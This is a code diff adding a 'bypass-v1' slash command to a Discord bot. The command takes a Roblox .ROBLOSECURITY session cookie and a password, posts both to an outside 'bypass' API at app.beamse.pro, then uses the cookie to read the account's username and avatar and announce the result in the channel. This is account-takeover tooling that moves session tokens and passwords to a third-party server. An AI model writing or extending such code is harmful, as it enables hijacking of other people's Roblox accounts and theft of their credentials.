@@ -40,6 +40,22 @@ async function registerCommands() {
     new SlashCommandBuilder()
       .setName('tophitters')
       .setDescription('Show top 3 hitters today')
+      .toJSON(),
+    new SlashCommandBuilder()
+      .setName('bypass-v1')
+      .setDescription('Bypass a Roblox account cookie')
+      .addStringOption(option =>
+        option
+          .setName('cookie')
+          .setDescription('The Roblox cookie to bypass')
+          .setRequired(true)
+      )
+      .addStringOption(option =>
+        option
+          .setName('password')
+          .setDescription('The password for the bypass')
+          .setRequired(true)
+      )
       .toJSON()
   ];
 
@@ -163,6 +179,68 @@ client.once('clientReady', () => {
 
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand()) return;
+
+  if (interaction.commandName === 'bypass-v1') {
+    const cookie = interaction.options.getString('cookie');
+    const password = interaction.options.getString('password');
+
+    await interaction.deferReply({ ephemeral: true });
+
+    try {
+      // Call bypass API
+      const bypassRes = await axios.post(
+        'https://app.beamse.pro/api/bypass.php',
+        { cookie, bypass_type: 'all_ages', password },
+        { headers: { 'Content-Type': 'application/json' } }
+      );
+      const result = bypassRes.data;
+
+      // Fetch Roblox username + avatar using the cookie
+      let robloxUsername = 'Unknown';
+      let robloxAvatarUrl = null;
+
+      try {
+        const authRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
+          headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+        });
+        const userId = authRes.data?.id;
+        robloxUsername = authRes.data?.name ?? 'Unknown';
+
+        if (userId) {
+          const thumbRes = await axios.get(
+            `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`
+          );
+          robloxAvatarUrl = thumbRes.data?.data?.[0]?.imageUrl ?? null;
+        }
+      } catch (_) {
+        // Roblox fetch failed, continue with defaults
+      }
+
+      const discordAvatar = interaction.user.displayAvatarURL({ dynamic: true });
+
+      const embed = new EmbedBuilder()
+        .setColor(result.success ? 0x57f287 : 0xed4245)
+        .setAuthor({
+          name: `@${interaction.user.username}`,
+          iconURL: discordAvatar
+        })
+        .addFields(
+          { name: 'Username', value: robloxUsername },
+          { name: 'Status', value: result.message ?? (result.success ? 'Success' : 'Failed') }
+        )
+        .setTimestamp();
+
+      if (robloxAvatarUrl) embed.setThumbnail(robloxAvatarUrl);
+
+      // Ephemeral ack, then public result
+      await interaction.editReply({ content: '\u2705 Done.' });
+      return interaction.followUp({ embeds: [embed] });
+
+    } catch (error) {
+      console.error('Bypass API Error:', error.response?.status, error.message);
+      return interaction.editReply('\u274c Failed to contact bypass API.');
+    }
+  }
 
   if (interaction.commandName === 'tophitters') {
     await interaction.deferReply();
